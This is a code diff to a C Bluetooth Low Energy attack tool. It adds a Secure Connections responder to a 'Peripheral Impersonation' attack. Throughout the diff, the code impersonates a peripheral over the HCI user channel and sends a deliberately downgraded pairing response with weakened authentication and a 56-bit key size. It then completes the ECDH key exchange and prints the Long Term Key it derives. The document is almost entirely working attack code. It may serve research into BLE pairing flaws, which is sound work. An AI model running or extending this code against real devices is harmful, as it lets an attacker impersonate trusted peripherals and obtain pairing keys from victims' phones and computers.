@@ -12,7 +12,8 @@
 #include "blerp_attack.h"
 #include "mgmt.h"
 #include "../ui.h"
-#include "smp.h" // SMP_CODE_* opcodes
+#include "smp.h" // SMP_CODE_* opcodes, SMP_AUTHREQ_*
+#include "smp_sc_engine.h"
 #include "../wire/hci_wire.h"
 #include "../wire/hci_user_channel.h"
 
@@ -86,6 +87,7 @@ void blerp_config_init(struct blerp_attack_config *cfg, enum blerp_attack_type t
     cfg->downgraded_keysize = 7;     // Minimum 56-bit key
     cfg->wait_conn_ms = 60000;
     cfg->wait_react_ms = 10000;
+    cfg->allow_sc = false; // Legacy-only by default; see blerp_attack.h
 }
 
 // Construct advertising payload containing Flags, Complete Name, and Appearance.
@@ -299,6 +301,134 @@ void blerp_classify_vulnerabilities(const struct smp_bond_info *bond,
     }
 }
 
+// Complete LE Secure Connections Just Works as responder, after the caller
+// (blerp_run_pi) received a Pairing Request with the SC bit set and
+// cfg->allow_sc is true. Drives Public Key exchange, Confirm/Random, and
+// DHKey Check to completion, failure, or cfg->wait_react_ms timeout. See
+// smp_sc_engine.h for the message-ordering caveats.
+static void run_pi_sc_responder(int fd, uint16_t handle,
+                                const struct blerp_attack_config *cfg,
+                                struct blerp_attack_report *rep,
+                                const uint8_t preq_pdu[7], uint8_t own_addr_type,
+                                const uint8_t ia[6], const uint8_t ra[6]) {
+    uint8_t my_nonce[16];
+    if (RAND_bytes(my_nonce, 16) != 1) memset(my_nonce, 0x42, 16);
+
+    struct smp_sc sc;
+    if (smp_sc_init(&sc, false, 0, ia, own_addr_type, ra, my_nonce) < 0) {
+        printf("  %s[-] Could not generate an ECDH key pair for SC; aborting.%s\n", UI_RED, UI_RESET);
+        return;
+    }
+    smp_sc_set_params(&sc, cfg->downgraded_authreq, cfg->downgraded_keysize);
+
+    if (smp_sc_on_req(&sc, preq_pdu) < 0) { smp_sc_free(&sc); return; }
+
+    uint8_t pres[7];
+    smp_sc_make_rsp(&sc, pres);
+    hci_user_channel_send_acl(fd, handle, SMP_CID_VAL, pres, 7);
+    rep->pres_sent = true;
+    rep->negotiated_authreq = pres[3];
+    rep->negotiated_keysize = pres[4];
+    printf("  [*] Peer offered LE Secure Connections; completing SC Just Works instead of downgrading to Legacy.\n");
+    printf("  [SMP RSP] Sent downgraded SC Pairing Response (AuthReq=0x%02x, KeySize=%d, V3/V4/V6)\n",
+           pres[3], pres[4]);
+
+    bool sent_confirm = false, sent_random = false, sent_check = false;
+    struct timeval start, now;
+    gettimeofday(&start, NULL);
+
+    while (1) {
+        gettimeofday(&now, NULL);
+        long elapsed = (now.tv_sec - start.tv_sec) * 1000 + (now.tv_usec - start.tv_usec) / 1000;
+        int remaining = cfg->wait_react_ms - (int)elapsed;
+        if (remaining <= 0) break;
+
+        struct pollfd pfd = { .fd = fd, .events = POLLIN, .revents = 0 };
+        if (poll(&pfd, 1, remaining) <= 0) break;
+
+        uint8_t pkt[1024];
+        ssize_t n = read(fd, pkt, sizeof pkt);
+        if (n < 2) continue;
+        if (pkt[0] == HCI_EVENT_PKT && pkt[1] == HCI_EV_DISCONN_COMPL) {
+            printf("  [-] Central disconnected.\n");
+            break;
+        }
+        if (pkt[0] != HCI_ACLDATA_PKT || n < 10) continue;
+        uint16_t cid = (uint16_t)(pkt[7] | (pkt[8] << 8));
+        if (cid != SMP_CID_VAL) continue;
+        uint8_t op = pkt[9];
+        uint16_t pdu_len = (uint16_t)(n - 9);
+
+        if (op == SMP_SC_OP_PUBLIC_KEY && pdu_len == 65 && !sent_confirm) {
+            if (smp_sc_on_pubkey(&sc, &pkt[9]) < 0) {
+                printf("  %s[-] Invalid peer public key (not a valid P-256 point); aborting.%s\n", UI_RED, UI_RESET);
+                break;
+            }
+            printf("  [SMP] Received Public Key from Central.\n");
+
+            uint8_t my_pk[65];
+            smp_sc_make_pubkey(&sc, my_pk);
+            hci_user_channel_send_acl(fd, handle, SMP_CID_VAL, my_pk, 65);
+            printf("  [SMP] Sent Public Key.\n");
+
+            uint8_t confirm[17];
+            smp_sc_make_confirm(&sc, confirm);
+            hci_user_channel_send_acl(fd, handle, SMP_CID_VAL, confirm, 17);
+            sent_confirm = true;
+            printf("  [SMP] Sent Pairing Confirm (committing to our nonce, SC Just Works).\n");
+        } else if (op == SMP_SC_OP_PAIRING_RANDOM && pdu_len == 17 && sent_confirm && !sent_random) {
+            smp_sc_on_random(&sc, &pkt[9]);
+            printf("  [SMP] Received Pairing Random from Central.\n");
+
+            uint8_t srandom[17];
+            smp_sc_make_random(&sc, srandom);
+            hci_user_channel_send_acl(fd, handle, SMP_CID_VAL, srandom, 17);
+            sent_random = true;
+            printf("  [SMP] Sent Pairing Random.\n");
+
+            if (smp_sc_derive_keys(&sc) < 0) {
+                printf("  %s[-] Key derivation failed; aborting.%s\n", UI_RED, UI_RESET);
+                break;
+            }
+        } else if (op == SMP_SC_OP_DHKEY_CHECK && pdu_len == 17 && sent_random && !sent_check) {
+            if (smp_sc_on_dhkey_check(&sc, &pkt[9]) < 0) break;
+            printf("  [SMP] Received DHKey Check from Central.\n");
+
+            if (sc.failed) {
+                rep->pairing_failed = true;
+                rep->fail_reason = sc.reason;
+                printf("  %s[!] DHKey Check mismatch (reason 0x%02x); SC pairing failed.%s\n",
+                       UI_RED, sc.reason, UI_RESET);
+                break;
+            }
+
+            uint8_t check[17];
+            smp_sc_make_dhkey_check(&sc, check);
+            hci_user_channel_send_acl(fd, handle, SMP_CID_VAL, check, 17);
+            sent_check = true;
+            printf("  [SMP] Sent DHKey Check.\n");
+
+            if (sc.done) {
+                rep->phase2_completed = true;
+                rep->sc_used = true;
+                memcpy(rep->stk, sc.ltk, 16);
+                printf("  %s[+] Phase 2 SC completed! Long Term Key derived successfully.%s\n", UI_GREEN, UI_RESET);
+                printf("  [KEY] LTK: ");
+                for (int k = 0; k < 16; k++) printf("%02x", rep->stk[k]);
+                printf("\n");
+            }
+            break;
+        } else if (op == SMP_SC_OP_PAIRING_FAILED) {
+            rep->pairing_failed = true;
+            rep->fail_reason = (n >= 11) ? pkt[10] : 0;
+            printf("  %s[!] Central aborted SC pairing (Pairing Failed, reason 0x%02x)%s\n",
+                   UI_RED, rep->fail_reason, UI_RESET);
+            break;
+        }
+    }
+    smp_sc_free(&sc);
+}
+
 // Execute Peripheral Impersonation attack over HCI User Channel.
 int blerp_run_pi(const struct blerp_attack_config *cfg, struct blerp_attack_report *rep) {
     if (!cfg || !rep) return -1;
@@ -447,13 +577,19 @@ int blerp_run_pi(const struct blerp_attack_config *cfg, struct blerp_attack_repo
                 rep->preq_received = true;
                 printf("  [SMP REQ] Received Pairing Request from Central (AuthReq=0x%02x, MaxKey=%d)\n",
                        pkt[12], pkt[13]);
+                answered_req = true;
+
+                if (cfg->allow_sc && (pkt[12] & SMP_AUTHREQ_SC) != 0) {
+                    run_pi_sc_responder(fd, handle, cfg, rep, &pkt[9], own_addr_type, dummy_ia, dummy_ra);
+                    break; // the SC sub-loop handled the rest of Phase 2 itself
+                }
+
                 (void)smp_legacy_on_req(&leg, &pkt[9]);
 
                 uint8_t pres[7];
                 smp_legacy_make_rsp(&leg, pres);
                 hci_user_channel_send_acl(fd, handle, SMP_CID_VAL, pres, 7);
                 rep->pres_sent = true;
-                answered_req = true;
                 rep->negotiated_authreq = pres[3];
                 rep->negotiated_keysize = pres[4];
                 printf("  [SMP RSP] Sent downgraded Pairing Response (AuthReq=0x%02x, KeySize=%d, V3/V4/V6)\n",
